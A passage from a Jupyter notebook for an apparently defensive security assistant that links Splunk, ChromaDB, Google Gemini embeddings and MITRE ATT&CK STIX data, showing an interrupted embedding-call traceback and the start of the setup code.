      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[5]\u001b[39m\u001b[32m, line 491\u001b[39m\n\u001b[32m    489\u001b[39m mitre_all_data_points = load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH)\n\u001b[32m    490\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m mitre_all_data_points:\n\u001b[32m--> \u001b[39m\u001b[32m491\u001b[39m     \u001b[43mpopulate_security_knowledge_base\u001b[49m\u001b[43m(\u001b[49m\u001b[43mmitre_all_data_points\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    492\u001b[39m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m    493\u001b[39m     \u001b[38;5;28mprint\u001b[39m(\u001b[33m\"\u001b[39m\u001b[33mMITRE ATT&CK data not loaded from file. AI mapping might be less effective.\u001b[39m\u001b[33m\"\u001b[39m)\n",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[5]\u001b[39m\u001b[32m, line 251\u001b[39m, in \u001b[36mpopulate_security_knowledge_base\u001b[39m\u001b[34m(data_points)\u001b[39m\n\u001b[32m    247\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m unique_id \u001b[38;5;129;01min\u001b[39;00m existing_ids:\n\u001b[32m    248\u001b[39m     \u001b[38;5;66;03m# print(f\"Skipping existing document with ID: {unique_id}\") # Uncomment for verbose debugging\u001b[39;00m\n\u001b[32m    249\u001b[39m     \u001b[38;5;28;01mcontinue\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m251\u001b[39m embedding = \u001b[43mget_embedding\u001b[49m\u001b[43m(\u001b[49m\u001b[43mdp\u001b[49m\u001b[43m[\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mtext\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m]\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    252\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m embedding \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m: \u001b[38;5;66;03m# Ensure embedding was successfully generated\u001b[39;00m\n\u001b[32m    253\u001b[39m     docs_to_add.append(dp[\u001b[33m\"\u001b[39m\u001b[33mtext\u001b[39m\u001b[33m\"\u001b[39m])\n",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[5]\u001b[39m\u001b[32m, line 116\u001b[39m, in \u001b[36mget_embedding\u001b[39m\u001b[34m(text)\u001b[39m\n\u001b[32m    113\u001b[39m \u001b[38;5;250m\u001b[39m\u001b[33;03m\"\"\"Generates an embedding for the given text using the specified Gemini embedding model.\"\"\"\u001b[39;00m\n\u001b[32m    114\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m    115\u001b[39m     \u001b[38;5;66;03m# Use RETRIEVAL_DOCUMENT for texts meant to be retrieved (like knowledge base entries)\u001b[39;00m\n\u001b[32m--> \u001b[39m\u001b[32m116\u001b[39m     response = \u001b[43mgenai\u001b[49m\u001b[43m.\u001b[49m\u001b[43membed_content\u001b[49m\u001b[43m(\u001b[49m\u001b[43mmodel\u001b[49m\u001b[43m=\u001b[49m\u001b[43membedding_model\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mcontent\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtext\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtask_type\u001b[49m\u001b[43m=\u001b[49m\u001b[33;43m\"\u001b[39;49m\u001b[33;43mRETRIEVAL_DOCUMENT\u001b[39;49m\u001b[33;43m\"\u001b[39;49m\u001b[43m)\u001b[49m\n\u001b[32m    117\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m response[\u001b[33m'\u001b[39m\u001b[33membedding\u001b[39m\u001b[33m'\u001b[39m]\n\u001b[32m    118\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m e:\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\generativeai\\embedding.py:213\u001b[39m, in \u001b[36membed_content\u001b[39m\u001b[34m(model, content, task_type, title, output_dimensionality, client, request_options)\u001b[39m\n\u001b[32m    205\u001b[39m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[32m    206\u001b[39m     embedding_request = protos.EmbedContentRequest(\n\u001b[32m    207\u001b[39m         model=model,\n\u001b[32m    208\u001b[39m         content=content_types.to_content(content),\n\u001b[32m   (...)\u001b[39m\u001b[32m    211\u001b[39m         output_dimensionality=output_dimensionality,\n\u001b[32m    212\u001b[39m     )\n\u001b[32m--> \u001b[39m\u001b[32m213\u001b[39m     embedding_response = \u001b[43mclient\u001b[49m\u001b[43m.\u001b[49m\u001b[43membed_content\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    214\u001b[39m \u001b[43m        \u001b[49m\u001b[43membedding_request\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    215\u001b[39m \u001b[43m        \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mrequest_options\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    216\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    217\u001b[39m     embedding_dict = \u001b[38;5;28mtype\u001b[39m(embedding_response).to_dict(embedding_response)\n\u001b[32m    218\u001b[39m     embedding_dict[\u001b[33m\"\u001b[39m\u001b[33membedding\u001b[39m\u001b[33m\"\u001b[39m] = embedding_dict[\u001b[33m\"\u001b[39m\u001b[33membedding\u001b[39m\u001b[33m\"\u001b[39m][\u001b[33m\"\u001b[39m\u001b[33mvalues\u001b[39m\u001b[33m\"\u001b[39m]\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\ai\\generativelanguage_v1beta\\services\\generative_service\\client.py:1263\u001b[39m, in \u001b[36mGenerativeServiceClient.embed_content\u001b[39m\u001b[34m(self, request, model, content, retry, timeout, metadata)\u001b[39m\n\u001b[32m   1260\u001b[39m \u001b[38;5;28mself\u001b[39m._validate_universe_domain()\n\u001b[32m   1262\u001b[39m \u001b[38;5;66;03m# Send the request.\u001b[39;00m\n\u001b[32m-> \u001b[39m\u001b[32m1263\u001b[39m response = \u001b[43mrpc\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m   1264\u001b[39m \u001b[43m    \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m   1265\u001b[39m \u001b[43m    \u001b[49m\u001b[43mretry\u001b[49m\u001b[43m=\u001b[49m\u001b[43mretry\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m   1266\u001b[39m \u001b[43m    \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m   1267\u001b[39m \u001b[43m    \u001b[49m\u001b[43mmetadata\u001b[49m\u001b[43m=\u001b[49m\u001b[43mmetadata\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m   1268\u001b[39m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   1270\u001b[39m \u001b[38;5;66;03m# Done; return the response.\u001b[39;00m\n\u001b[32m   1271\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m response\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\api_core\\gapic_v1\\method.py:131\u001b[39m, in \u001b[36m_GapicCallable.__call__\u001b[39m\u001b[34m(self, timeout, retry, compression, *args, **kwargs)\u001b[39m\n\u001b[32m    128\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;28mself\u001b[39m._compression \u001b[38;5;129;01mis\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m \u001b[38;5;28;01mNone\u001b[39;00m:\n\u001b[32m    129\u001b[39m     kwargs[\u001b[33m\"\u001b[39m\u001b[33mcompression\u001b[39m\u001b[33m\"\u001b[39m] = compression\n\u001b[32m--> \u001b[39m\u001b[32m131\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mwrapped_func\u001b[49m\u001b[43m(\u001b[49m\u001b[43m*\u001b[49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\api_core\\retry\\retry_unary.py:293\u001b[39m, in \u001b[36mRetry.__call__.<locals>.retry_wrapped_func\u001b[39m\u001b[34m(*args, **kwargs)\u001b[39m\n\u001b[32m    289\u001b[39m target = functools.partial(func, *args, **kwargs)\n\u001b[32m    290\u001b[39m sleep_generator = exponential_sleep_generator(\n\u001b[32m    291\u001b[39m     \u001b[38;5;28mself\u001b[39m._initial, \u001b[38;5;28mself\u001b[39m._maximum, multiplier=\u001b[38;5;28mself\u001b[39m._multiplier\n\u001b[32m    292\u001b[39m )\n\u001b[32m--> \u001b[39m\u001b[32m293\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mretry_target\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    294\u001b[39m \u001b[43m    \u001b[49m\u001b[43mtarget\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    295\u001b[39m \u001b[43m    \u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_predicate\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    296\u001b[39m \u001b[43m    \u001b[49m\u001b[43msleep_generator\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    297\u001b[39m \u001b[43m    \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_timeout\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    298\u001b[39m \u001b[43m    \u001b[49m\u001b[43mon_error\u001b[49m\u001b[43m=\u001b[49m\u001b[43mon_error\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    299\u001b[39m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\api_core\\retry\\retry_unary.py:144\u001b[39m, in \u001b[36mretry_target\u001b[39m\u001b[34m(target, predicate, sleep_generator, timeout, on_error, exception_factory, **kwargs)\u001b[39m\n\u001b[32m    142\u001b[39m \u001b[38;5;28;01mfor\u001b[39;00m sleep \u001b[38;5;129;01min\u001b[39;00m sleep_generator:\n\u001b[32m    143\u001b[39m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m144\u001b[39m         result = \u001b[43mtarget\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    145\u001b[39m         \u001b[38;5;28;01mif\u001b[39;00m inspect.isawaitable(result):\n\u001b[32m    146\u001b[39m             warnings.warn(_ASYNC_RETRY_WARNING)\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\api_core\\timeout.py:130\u001b[39m, in \u001b[36mTimeToDeadlineTimeout.__call__.<locals>.func_with_timeout\u001b[39m\u001b[34m(*args, **kwargs)\u001b[39m\n\u001b[32m    126\u001b[39m         remaining_timeout = \u001b[38;5;28mself\u001b[39m._timeout\n\u001b[32m    128\u001b[39m     kwargs[\u001b[33m\"\u001b[39m\u001b[33mtimeout\u001b[39m\u001b[33m\"\u001b[39m] = remaining_timeout\n\u001b[32m--> \u001b[39m\u001b[32m130\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mfunc\u001b[49m\u001b[43m(\u001b[49m\u001b[43m*\u001b[49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\api_core\\grpc_helpers.py:76\u001b[39m, in \u001b[36m_wrap_unary_errors.<locals>.error_remapped_callable\u001b[39m\u001b[34m(*args, **kwargs)\u001b[39m\n\u001b[32m     73\u001b[39m \u001b[38;5;129m@functools\u001b[39m.wraps(callable_)\n\u001b[32m     74\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34merror_remapped_callable\u001b[39m(*args, **kwargs):\n\u001b[32m     75\u001b[39m     \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m---> \u001b[39m\u001b[32m76\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m \u001b[43mcallable_\u001b[49m\u001b[43m(\u001b[49m\u001b[43m*\u001b[49m\u001b[43margs\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43m*\u001b[49m\u001b[43m*\u001b[49m\u001b[43mkwargs\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m     77\u001b[39m     \u001b[38;5;28;01mexcept\u001b[39;00m grpc.RpcError \u001b[38;5;28;01mas\u001b[39;00m exc:\n\u001b[32m     78\u001b[39m         \u001b[38;5;28;01mraise\u001b[39;00m exceptions.from_grpc_error(exc) \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34;01mexc\u001b[39;00m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\grpc\\_interceptor.py:277\u001b[39m, in \u001b[36m_UnaryUnaryMultiCallable.__call__\u001b[39m\u001b[34m(self, request, timeout, metadata, credentials, wait_for_ready, compression)\u001b[39m\n\u001b[32m    268\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34m__call__\u001b[39m(\n\u001b[32m    269\u001b[39m     \u001b[38;5;28mself\u001b[39m,\n\u001b[32m    270\u001b[39m     request: Any,\n\u001b[32m   (...)\u001b[39m\u001b[32m    275\u001b[39m     compression: Optional[grpc.Compression] = \u001b[38;5;28;01mNone\u001b[39;00m,\n\u001b[32m    276\u001b[39m ) -> Any:\n\u001b[32m--> \u001b[39m\u001b[32m277\u001b[39m     response, ignored_call = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_with_call\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    278\u001b[39m \u001b[43m        \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    279\u001b[39m \u001b[43m        \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    280\u001b[39m \u001b[43m        \u001b[49m\u001b[43mmetadata\u001b[49m\u001b[43m=\u001b[49m\u001b[43mmetadata\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    281\u001b[39m \u001b[43m        \u001b[49m\u001b[43mcredentials\u001b[49m\u001b[43m=\u001b[49m\u001b[43mcredentials\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    282\u001b[39m \u001b[43m        \u001b[49m\u001b[43mwait_for_ready\u001b[49m\u001b[43m=\u001b[49m\u001b[43mwait_for_ready\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    283\u001b[39m \u001b[43m        \u001b[49m\u001b[43mcompression\u001b[49m\u001b[43m=\u001b[49m\u001b[43mcompression\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    284\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    285\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m response\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\grpc\\_interceptor.py:329\u001b[39m, in \u001b[36m_UnaryUnaryMultiCallable._with_call\u001b[39m\u001b[34m(self, request, timeout, metadata, credentials, wait_for_ready, compression)\u001b[39m\n\u001b[32m    326\u001b[39m     \u001b[38;5;28;01mexcept\u001b[39;00m \u001b[38;5;167;01mException\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m exception:  \u001b[38;5;66;03m# pylint:disable=broad-except\u001b[39;00m\n\u001b[32m    327\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m _FailureOutcome(exception, sys.exc_info()[\u001b[32m2\u001b[39m])\n\u001b[32m--> \u001b[39m\u001b[32m329\u001b[39m call = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_interceptor\u001b[49m\u001b[43m.\u001b[49m\u001b[43mintercept_unary_unary\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    330\u001b[39m \u001b[43m    \u001b[49m\u001b[43mcontinuation\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mclient_call_details\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mrequest\u001b[49m\n\u001b[32m    331\u001b[39m \u001b[43m\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    332\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m call.result(), call\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\google\\ai\\generativelanguage_v1beta\\services\\generative_service\\transports\\grpc.py:79\u001b[39m, in \u001b[36m_LoggingClientInterceptor.intercept_unary_unary\u001b[39m\u001b[34m(self, continuation, client_call_details, request)\u001b[39m\n\u001b[32m     64\u001b[39m     grpc_request = {\n\u001b[32m     65\u001b[39m         \u001b[33m\"\u001b[39m\u001b[33mpayload\u001b[39m\u001b[33m\"\u001b[39m: request_payload,\n\u001b[32m     66\u001b[39m         \u001b[33m\"\u001b[39m\u001b[33mrequestMethod\u001b[39m\u001b[33m\"\u001b[39m: \u001b[33m\"\u001b[39m\u001b[33mgrpc\u001b[39m\u001b[33m\"\u001b[39m,\n\u001b[32m     67\u001b[39m         \u001b[33m\"\u001b[39m\u001b[33mmetadata\u001b[39m\u001b[33m\"\u001b[39m: \u001b[38;5;28mdict\u001b[39m(request_metadata),\n\u001b[32m     68\u001b[39m     }\n\u001b[32m     69\u001b[39m     _LOGGER.debug(\n\u001b[32m     70\u001b[39m         \u001b[33mf\u001b[39m\u001b[33m\"\u001b[39m\u001b[33mSending request for \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mclient_call_details.method\u001b[38;5;132;01m}\u001b[39;00m\u001b[33m\"\u001b[39m,\n\u001b[32m     71\u001b[39m         extra={\n\u001b[32m   (...)\u001b[39m\u001b[32m     76\u001b[39m         },\n\u001b[32m     77\u001b[39m     )\n\u001b[32m---> \u001b[39m\u001b[32m79\u001b[39m response = \u001b[43mcontinuation\u001b[49m\u001b[43m(\u001b[49m\u001b[43mclient_call_details\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m     80\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m logging_enabled:  \u001b[38;5;66;03m# pragma: NO COVER\u001b[39;00m\n\u001b[32m     81\u001b[39m     response_metadata = response.trailing_metadata()\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\grpc\\_interceptor.py:315\u001b[39m, in \u001b[36m_UnaryUnaryMultiCallable._with_call.<locals>.continuation\u001b[39m\u001b[34m(new_details, request)\u001b[39m\n\u001b[32m    306\u001b[39m (\n\u001b[32m    307\u001b[39m     new_method,\n\u001b[32m    308\u001b[39m     new_timeout,\n\u001b[32m   (...)\u001b[39m\u001b[32m    312\u001b[39m     new_compression,\n\u001b[32m    313\u001b[39m ) = _unwrap_client_call_details(new_details, client_call_details)\n\u001b[32m    314\u001b[39m \u001b[38;5;28;01mtry\u001b[39;00m:\n\u001b[32m--> \u001b[39m\u001b[32m315\u001b[39m     response, call = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_thunk\u001b[49m\u001b[43m(\u001b[49m\u001b[43mnew_method\u001b[49m\u001b[43m)\u001b[49m\u001b[43m.\u001b[49m\u001b[43mwith_call\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m    316\u001b[39m \u001b[43m        \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    317\u001b[39m \u001b[43m        \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m=\u001b[49m\u001b[43mnew_timeout\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    318\u001b[39m \u001b[43m        \u001b[49m\u001b[43mmetadata\u001b[49m\u001b[43m=\u001b[49m\u001b[43mnew_metadata\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    319\u001b[39m \u001b[43m        \u001b[49m\u001b[43mcredentials\u001b[49m\u001b[43m=\u001b[49m\u001b[43mnew_credentials\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    320\u001b[39m \u001b[43m        \u001b[49m\u001b[43mwait_for_ready\u001b[49m\u001b[43m=\u001b[49m\u001b[43mnew_wait_for_ready\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    321\u001b[39m \u001b[43m        \u001b[49m\u001b[43mcompression\u001b[49m\u001b[43m=\u001b[49m\u001b[43mnew_compression\u001b[49m\u001b[43m,\u001b[49m\n\u001b[32m    322\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m    323\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m _UnaryOutcome(response, call)\n\u001b[32m    324\u001b[39m \u001b[38;5;28;01mexcept\u001b[39;00m grpc.RpcError \u001b[38;5;28;01mas\u001b[39;00m rpc_error:\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\grpc\\_channel.py:1195\u001b[39m, in \u001b[36m_UnaryUnaryMultiCallable.with_call\u001b[39m\u001b[34m(self, request, timeout, metadata, credentials, wait_for_ready, compression)\u001b[39m\n\u001b[32m   1183\u001b[39m \u001b[38;5;28;01mdef\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[34mwith_call\u001b[39m(\n\u001b[32m   1184\u001b[39m     \u001b[38;5;28mself\u001b[39m,\n\u001b[32m   1185\u001b[39m     request: Any,\n\u001b[32m   (...)\u001b[39m\u001b[32m   1190\u001b[39m     compression: Optional[grpc.Compression] = \u001b[38;5;28;01mNone\u001b[39;00m,\n\u001b[32m   1191\u001b[39m ) -> Tuple[Any, grpc.Call]:\n\u001b[32m   1192\u001b[39m     (\n\u001b[32m   1193\u001b[39m         state,\n\u001b[32m   1194\u001b[39m         call,\n\u001b[32m-> \u001b[39m\u001b[32m1195\u001b[39m     ) = \u001b[38;5;28;43mself\u001b[39;49m\u001b[43m.\u001b[49m\u001b[43m_blocking\u001b[49m\u001b[43m(\u001b[49m\n\u001b[32m   1196\u001b[39m \u001b[43m        \u001b[49m\u001b[43mrequest\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mtimeout\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mmetadata\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mcredentials\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mwait_for_ready\u001b[49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mcompression\u001b[49m\n\u001b[32m   1197\u001b[39m \u001b[43m    \u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   1198\u001b[39m     \u001b[38;5;28;01mreturn\u001b[39;00m _end_unary_response_blocking(state, call, \u001b[38;5;28;01mTrue\u001b[39;00m, \u001b[38;5;28;01mNone\u001b[39;00m)\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\grpc\\_channel.py:1162\u001b[39m, in \u001b[36m_UnaryUnaryMultiCallable._blocking\u001b[39m\u001b[34m(self, request, timeout, metadata, credentials, wait_for_ready, compression)\u001b[39m\n\u001b[32m   1145\u001b[39m state.target = _common.decode(\u001b[38;5;28mself\u001b[39m._target)\n\u001b[32m   1146\u001b[39m call = \u001b[38;5;28mself\u001b[39m._channel.segregated_call(\n\u001b[32m   1147\u001b[39m     cygrpc.PropagationConstants.GRPC_PROPAGATE_DEFAULTS,\n\u001b[32m   1148\u001b[39m     \u001b[38;5;28mself\u001b[39m._method,\n\u001b[32m   (...)\u001b[39m\u001b[32m   1160\u001b[39m     \u001b[38;5;28mself\u001b[39m._registered_call_handle,\n\u001b[32m   1161\u001b[39m )\n\u001b[32m-> \u001b[39m\u001b[32m1162\u001b[39m event = \u001b[43mcall\u001b[49m\u001b[43m.\u001b[49m\u001b[43mnext_event\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[32m   1163\u001b[39m _handle_event(event, state, \u001b[38;5;28mself\u001b[39m._response_deserializer)\n\u001b[32m   1164\u001b[39m \u001b[38;5;28;01mreturn\u001b[39;00m state, call\n",
      "\u001b[36mFile \u001b[39m\u001b[32msrc\\\\python\\\\grpcio\\\\grpc\\\\_cython\\\\_cygrpc/channel.pyx.pxi:388\u001b[39m, in \u001b[36mgrpc._cython.cygrpc.SegregatedCall.next_event\u001b[39m\u001b[34m()\u001b[39m\n",
      "\u001b[36mFile \u001b[39m\u001b[32msrc\\\\python\\\\grpcio\\\\grpc\\\\_cython\\\\_cygrpc/channel.pyx.pxi:211\u001b[39m, in \u001b[36mgrpc._cython.cygrpc._next_call_event\u001b[39m\u001b[34m()\u001b[39m\n",
      "\u001b[36mFile \u001b[39m\u001b[32msrc\\\\python\\\\grpcio\\\\grpc\\\\_cython\\\\_cygrpc/channel.pyx.pxi:205\u001b[39m, in \u001b[36mgrpc._cython.cygrpc._next_call_event\u001b[39m\u001b[34m()\u001b[39m\n",
      "\u001b[36mFile \u001b[39m\u001b[32msrc\\\\python\\\\grpcio\\\\grpc\\\\_cython\\\\_cygrpc/completion_queue.pyx.pxi:78\u001b[39m, in \u001b[36mgrpc._cython.cygrpc._latent_event\u001b[39m\u001b[34m()\u001b[39m\n",
      "\u001b[36mFile \u001b[39m\u001b[32msrc\\\\python\\\\grpcio\\\\grpc\\\\_cython\\\\_cygrpc/completion_queue.pyx.pxi:61\u001b[39m, in \u001b[36mgrpc._cython.cygrpc._internal_latent_event\u001b[39m\u001b[34m()\u001b[39m\n",
      "\u001b[36mFile \u001b[39m\u001b[32msrc\\\\python\\\\grpcio\\\\grpc\\\\_cython\\\\_cygrpc/completion_queue.pyx.pxi:42\u001b[39m, in \u001b[36mgrpc._cython.cygrpc._next\u001b[39m\u001b[34m()\u001b[39m\n",
      "\u001b[31mKeyboardInterrupt\u001b[39m: "
     ]
    }
   ],
   "source": [
    "import os\n",
    "import time\n",
    "import json\n",
    "from dotenv import load_dotenv\n",
    "\n",
    "# Splunk SDK imports\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "\n",
    "# ChromaDB import\n",
    "import chromadb\n",
    "\n",
    "# Google Gemini imports\n",
    "import google.generativeai as genai\n",
    "\n",
    "# STIX2 imports for MITRE ATT&CK parsing\n",
    "from stix2 import MemoryStore, Filter, AttackPattern, Relationship\n",
    "\n",
    "# Load environment variables from app.env file\n",
    "load_dotenv(\"app.env\")\n",
    "\n",
    "# --- Configuration ---\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"127.0.0.1\")\n",
    "SPLUNK_PORT = int(os.environ.get(\"SPLUNK_PORT\", 8089))\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\") # IMPORTANT: Update this in app.env\n",
    "SPLUNK_TOKEN = os.environ.get(\"SPLUNK_TOKEN\") # Optional, not used in current connect_to_splunk\n",
    "\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set. Get your key from Google AI Studio (https://makersuite.google.com/).\")\n",
    "\n",
    "# Configure Google Gemini\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "llm = genai.GenerativeModel('gemini-pro') # For text generation\n",
    "embedding_model = 'embedding-001' # For embeddings\n",
    "\n",
    "# ChromaDB Settings\n",
    "CHROMA_DB_PATH = \"./chroma_db\"\n",
    "chroma_client = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "SECURITY_COLLECTION_NAME = \"security_knowledge\"\n",
    "security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME)\n",
    "\n",
    "# MITRE ATT&CK Data File Path\n",
    "MITRE_STIX_JSON_PATH = \"enterprise-attack.json\" # Ensure this file is in the same directory as this script\n",
    "\n",
    "# --- Splunk Connection & Query Functions ---\n",
    "def connect_to_splunk():\n",
    "    \"\"\"Connects to Splunk and returns a Service object.\"\"\"\n",
